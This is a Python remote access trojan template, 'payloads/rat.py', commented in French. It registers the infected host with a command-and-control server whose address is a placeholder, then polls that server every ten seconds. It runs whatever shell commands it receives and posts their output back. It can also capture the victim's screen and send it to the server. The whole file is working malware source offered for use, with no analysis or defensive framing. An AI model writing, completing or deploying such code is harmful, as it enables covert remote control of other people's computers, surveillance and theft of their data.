#!/usr/bin/env python3
"""
payloads/rat.py — RAT HTTP polling
Poll le C2 toutes les 10s, exécute les commandes.
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, sys, json, time, socket
import platform, subprocess, urllib.request

C2     = "FILL_C2_URL"
BOT_ID = socket.gethostname()
POLL   = 10

def _post(url: str, data: dict):
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

def _get(url: str) -> dict:
    try:
        with urllib.request.urlopen(
            url, timeout=8
        ) as r:
            return json.loads(r.read())
    except Exception:
        return {}

def register():
    _post(f"{C2}/c2/register", {
        "id":   BOT_ID,
        "os":   platform.platform(),
        "user": os.getlogin(),
        "type": "rat",
    })

def run_cmd(cmd: str) -> str:
    if cmd.lower().startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            return f"cwd: {os.getcwd()}"
        except Exception as e:
            return str(e)
    if cmd.lower() == "sysinfo":
        return (
            f"host={socket.gethostname()}\n"
            f"os={platform.platform()}\n"
            f"user={os.getlogin()}\n"
            f"cwd={os.getcwd()}\n"
            f"py={platform.python_version()}"
        )
    if cmd.lower() == "screenshot":
        try:
            import base64, io
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=50)
            b64 = base64.b64encode(
                buf.getvalue()).decode()
            _post(f"{C2}/frame", {
                "type":  "screen_rat",
                "frame": f"data:image/jpeg;base64,{b64}",
                "ts":    __import__("datetime")
                         .datetime.now().isoformat(),
                "ua":    f"RAT/{BOT_ID}",
            })
            return "screenshot envoyé"
        except Exception as e:
            return f"screenshot error: {e}"
    try:
        r = subprocess.run(
            cmd, shell=True,
            capture_output=True,
            text=True, timeout=30,
        )
        return (r.stdout + r.stderr).strip() \
               or "(no output)"
    except subprocess.TimeoutExpired:
        return "timeout (30s)"
    except Exception as e:
        return str(e)

register()
while True:
    try:
        data = _get(f"{C2}/c2/task/{BOT_ID}")
        cmd  = data.get("cmd", "").strip()
        if cmd:
            result = run_cmd(cmd)
            _post(f"{C2}/c2/result/{BOT_ID}",
                  {"result": result})
    except Exception:
        pass
    time.sleep(POLL)